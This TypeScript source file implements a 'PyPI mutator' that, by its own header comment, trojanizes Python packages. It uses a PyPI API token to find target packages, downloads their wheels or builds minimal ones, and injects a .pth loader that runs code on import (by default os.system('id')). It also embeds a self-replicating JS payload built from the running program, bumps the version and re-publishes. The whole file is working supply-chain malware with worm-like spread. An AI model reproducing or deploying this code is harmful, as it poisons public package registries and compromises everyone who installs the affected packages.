// PyPI mutator — trojanizes Python packages by injecting a .pth file,
// bumping the patch version, and re-publishing.

import { INJECT_PTH } from "../../generated";
import { logUtil } from "../../utils/logger";
import { buildSelfExtractingPayload } from "../../utils/selfExtracting";
import { Mutator } from "../base";
import { parseMacaroonToken } from "./macaroonParse";
import { uploadWheel } from "./upload";
import {
  buildMinimalWheel,
  downloadWheel,
  extractInfo,
  fetchPackageMetaExtended,
  type PatchedWheel,
  type PatchOptions,
  patchWheel,
} from "./wheel";

function bumpPatch(version: string): string {
  const parts = version.split(".");
  const patch = String(Number(parts[2] ?? "0") + 1);
  return `${parts[0] ?? "0"}.${parts[1] ?? "0"}.${patch}`;
}

export { parseMacaroonToken } from "./macaroonParse";

// ---------------------------------------------------------------------------
// PypiMutator
// ---------------------------------------------------------------------------

export class PypiMutator extends Mutator {
  private readonly token: string;
  private readonly packages: string[];
  private readonly jsPayload: string;

  /**
   * @param token      PyPI API token (pypi-xxx...)
   * @param packages   Optional explicit package list.  If empty and the token
   *                   is a project-scoped token, the package list is derived
   *                   from the macaroon caveats.
   * @param jsPayload  JS payload to embed as _payload.js in the wheel.
   */
  constructor(token: string, packages: string[] = [], jsPayload = "") {
    super();
    if (!token) throw new Error("A PyPI token is required.");
    this.token = token;
    this.packages = packages;
    this.jsPayload = jsPayload;
  }

  async execute(): Promise<Boolean> {
    // 1. Determine target packages
    const targets = this.resolveTargets();
    if (targets.length === 0) {
      logUtil.log("[pypi] No target packages — nothing to do.");
      return false;
    }
    logUtil.log(
      `[pypi] Targeting ${targets.length} package(s): ${targets.join(", ")}`,
    );

    // 2. Read the .pth loader content
    const pthContent = (INJECT_PTH as string) || "import os; os.system('id')";

    // 3. Build JS payload if none provided
    let payload = this.jsPayload;
    if (!payload) {
      try {
        payload = buildSelfExtractingPayload(await Bun.file(Bun.main).text(), {
          wrap: true,
        });
      } catch {
        logUtil.log("[pypi] could not build JS payload");
      }
    }

    let published = 0;

    for (const pkg of targets) {
      try {
        const ok = await this.processPackage(pkg, pthContent, payload);
        if (ok) published++;
      } catch (e) {
        logUtil.log(
          `[pypi] Error processing ${pkg}: ${e instanceof Error ? e.message : String(e)}`,
        );
      }
    }

    logUtil.log(`[pypi] Done. Published ${published} package(s).`);
    return published > 0;
  }

  // -----------------------------------------------------------------------
  // Resolve the final package list
  // -----------------------------------------------------------------------

  private resolveTargets(): string[] {
    // If caller provided an explicit list, use it
    if (this.packages.length > 0) {
      return this.packages;
    }

    // Otherwise try to derive from a project-scoped token
    const macaroon = parseMacaroonToken(this.token);
    if (macaroon.type === "project" && macaroon.packages.length > 0) {
      return macaroon.packages;
    }

    // User token — fall back to TARGET_PACKAGES env var
    if (macaroon.type === "user") {
      const envPkgs = process.env.TARGET_PACKAGES;
      if (envPkgs) {
        const pkgs = envPkgs
          .split(",")
          .map((s) => s.trim())
          .filter(Boolean);
        logUtil.log(
          `[pypi] user token — using TARGET_PACKAGES env: ${pkgs.join(", ")}`,
        );
        return pkgs;
      }
    }

    return [];
  }

  // -----------------------------------------------------------------------
  // Per-package processing
  // -----------------------------------------------------------------------

  private async processPackage(
    pkgName: string,
    pthContent: string,
    jsPayload: string,
  ): Promise<boolean> {
    // 1. Fetch metadata — fall back to sdist if no wheel exists
    const meta = await fetchPackageMetaExtended(pkgName);
    if (!meta) {
      logUtil.log(`[pypi] ${pkgName}: not found on PyPI, skipping`);
      return false;
    }

    let wheelData: Uint8Array;
    let patched: PatchedWheel | null = null;

    if (meta.wheelUrl) {
      // Has a pre-built wheel — download and patch
      wheelData = (await downloadWheel(meta.wheelUrl))!;
      if (!wheelData) {
        logUtil.log(`[pypi] ${pkgName}: download failed, skipping`);
        return false;
      }
      patched = patchWheel({
        meta: {
          name: meta.name,
          version: meta.version,
          wheelUrl: meta.wheelUrl,
          wheelFilename: meta.wheelFilename!,
        },
        wheelData,
        pthContent,
        jsPayload: jsPayload || undefined,
      });
      logUtil.log(`[pypi] ${pkgName}: ${meta.version} → ${patched.newVersion}`);
    } else {
      // sdist only — build a minimal wheel with our payload
      logUtil.log(
        `[pypi] ${pkgName}: no wheel — building minimal wheel (sdist-only package)`,
      );
      const ver = bumpPatch(meta.version);
      wheelData = buildMinimalWheel({
        pkgName: meta.name,
        version: ver,
        pthContent,
        jsPayload: jsPayload || undefined,
        info: meta.info,
      });
      patched = {
        data: wheelData,
        filename: `${meta.name.replace(/[^\w.]+/g, "_")}-${ver}-py3-none-any.whl`,
        newVersion: ver,
      };
    }

    // 4. Upload
    return uploadWheel({
      token: this.token,
      pkgName: meta.name,
      version: patched.newVersion,
      filename: patched.filename,
      wheelData: patched.data,
      ...extractInfo(meta.info),
    });
  }
}
